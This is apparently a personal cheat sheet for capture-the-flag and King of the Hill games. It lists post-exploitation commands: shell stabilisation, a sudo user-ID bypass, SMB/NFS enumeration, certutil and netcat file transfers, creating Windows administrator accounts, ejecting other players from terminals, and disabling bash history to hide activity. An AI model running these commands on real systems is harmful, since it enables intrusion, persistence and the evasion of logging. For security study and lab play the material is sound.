# Linux
### Stablilize Shell
1. ctrl+z
2. stty raw -echo
3. fg (press enter x2)
4. export TERM=xterm , for using `clear` command

### Spawn bash
* /usr/bin/script -qc /bin/bash 1&>/dev/null
* python -c 'import pty;pty.spawn("/bin/bash")'
* python3 -c 'import pty;pty.spawn("/bin/bash")'

### Vulnerable sudo version
`sudo -u#-1 whoami`

### SMB Shares

#### SmbClient
* `smbclient -L \\\\<ip\\`     listing all shares
* `smbclient \\\\<ip>\\<share>` accessing a share anonymously
* `smbclient \\\\10.10.209.122\\<share> -U <share> `accessing a share with an authorized user

#### Smbmap
* `smbmap -u <username> -p <password> -H <ip>`

#### Smbget

* `smbget -R smb://<ip>/<share>` 

### NFS shares
* `showmount -e <ip> ` This lists the nfs shares
* `mount -t nfs <ip>:/<share_name> <directory_where_to_mount>` Mounting that share
### Finding Binaries

* find . - perm /4000 (user id uid) 
* find . -perm /2000 (group id guid)

### Changing file attributes

chattr + i filename `making file immutable`<br/>
chattr -i filename `making file mutable`<br/>
lschattr filename `Checking file attributes`

### Uploading Files

scp file/you/want `user@ip`:/path/to/store <br/>
python -m SimpleHTTPServer [port] `By default will listen on 8000`<br/>
python3 -m http.server [port] `By default will listen on 8000`<br/>

### Downloading Files

wget http://<ip>:port/<file>

### Netcat to download files from target

`nc -l -p [port] > file` Receive file <br/>
`nc -w 3 [ip] [port] < file `Send file <br/>

### Cracaking Zip Archive

* `fcrackzip -u -D -p <path_to_wordlist> <archive.zip>`

### killing a running job in same shell
`jobs`

```
Find it's job number

$ jobs
[1]+  Running                 sleep 100 &

$ kill %1
[1]+  Terminated              sleep 100

```

# Windows

### Adding User
net user "USER_NAME" "PASS" /add
### Changing User's password
net user "USER_NAME" "NEWPASS"
### Adding User to Administrators
net localgroup administrators "USER_NAME" /add
### Changing File Permissions
CACLS files /e /p {USERNAME}:{PERMISSION}<br/>
Permissions:<br/>
1.R `Read`<br/>
2.W `Write`<br/>
3.C `Change`<br/>
4.F `Full Control`

### Set File bits
attrib +r filename `add read only bit`<br/>
attrib -r filename `remove read only bit`<br/>
attrib +h filename `add hidden bit `<br/>
attrib -h filename `remove hidden bit`

### Show hidden file/folder
dir /a `show all hidden files & folder`<br/>
dir /a:d `show only hidden folder`<br/>
dir /a:h `show only hidden files`<br/>

### Downloading Files

`certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe`<br />
`powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`

# Msfvenom
### List All Payloads
msfvenom -l payloads
### List Payload Format
msfvenom --list formats

# Meterpreter
### Adding user for RDP
run getgui -u [USER_NAME] -p [PASS]

# King Of The Hill (KoTH)
### Monitoring and Closing Shell (Linux)
* strace `debugging / tamper with processes`
* gbd `c/c++ debugger`
* script - records terminal activites
* w /who `check current pts ,terminal device`
* ps -t ps/pts-number `process monitoring`
* script /dev/pts/pts-number `montior terminal`
* cat /dev/urandom > /dev/pts/pts-number  2>/dev/null `prints arbitary text on terminal`
* pkill -9 -t pts/pts-number

### Change SSH port
`nano /etc/ssh/sshd_config` (change PORT 22 to any port you want also you can tinker with configuration file)

### Hide yourself from "w" or "who"
`ssh user@ip -T` This -T will have some limiations , that you cannot run bash and some other commands but is helpful.

### Run Bash script on king.txt
`while [ 1 ]; do /root/chattr -i king.txt; done &`

### Send messages to logged in users
* echo "msg" > /dev/pts/pts-number `send message to specific user`<br />
* wall msg `boradcast message to everyone`<br />
  
### Closing Session (Windows)
* quser
* logoff id|user_name  


export HISTFILE=/dev/null found this it might help you out a little when doing KOTH it basically stops bash logging your commands in the ~/.bash_history file
